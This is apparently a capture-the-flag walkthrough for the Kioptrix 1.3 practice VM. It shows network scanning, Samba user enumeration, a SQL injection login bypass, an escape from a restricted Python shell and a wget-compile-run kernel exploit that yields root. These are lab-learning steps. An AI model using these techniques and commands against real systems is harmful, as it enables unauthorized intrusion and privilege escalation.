*Kioptrix*narrative
Intro
    The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player).
    The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

Level 1.3
    First, run host discovery scan to find the IP belonging to the MAC assigned by VMware:
    *root@kali:/tmp# nmap -sP 192.168.0.1/24
Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-23 16:47 BST
MAC Address: 00:0C:29:D8:0F:B1 (VMware)
Nmap scan report for 192.168.0.12*

    Once we know the target, we run a service discovery scan:
    *# nmap -T5 -sV -A 192.168.0.12

Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-23 17:01 BST
Nmap scan report for 192.168.0.12
Host is up (0.00043s latency).
PORT    STATE SERVICE     VERSION

    So it runs SSH, Web and Samba. I run a samba scan against the target:
    *$ enum4linux 192.168.0.12

 =============================
|    Users on 192.168.0.12    |

index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)

index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)*

    So we know there are three more users in the system.

    I open the web server in the browser and get presented a login page
    #Kioptrix.1.3.login.png#

    I try to login using Admin and passwords 1234, admin, etc.. It does not work. Next step is to test it against input validation attacks such as SQL injection. Try Simple Sql Injection with *' or '1'='1* and we are shown the following error.

    *Oups, something went wrong with your member's page account.
Please contact your local Administrator
 to fix the issue.*

    The URL of the error page looks like:

    *http://192.168.0.12/member.php?username=Admin*

    Next step, is try multiple input validation issues for the username param.

    Sending a dot in the parameter produces the following error:

    * Warning: include() [function.include]: Failed opening './..php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/member.php on line 14*

    I run a directory discovery attack and find the directory **http://192.168.0.12/john/**

    We can use the authentication bypass to log in using credentials **john** and password **' or '1'='1**. However, we are presented the following page:
    #Kiotrix1.3.password.png#

    I try to log in with that username through SSH:
    *root@kali:/tmp# ssh john@192.168.0.12

Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$*

    We are given a limited shell. We run some commands, google a bit and find out it is a python shell. We can bypass the sandbox by running:

    *john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ *

    Now, we can execute any command. The kernel it uses is vulnerable to a ring0 bug, we can get root with the following exploit:
    *john@Kioptrix4:~$ wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -o 36038-6; chmod +x 36038-6; ./36038-6
# bash

Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

Thanks for playing,
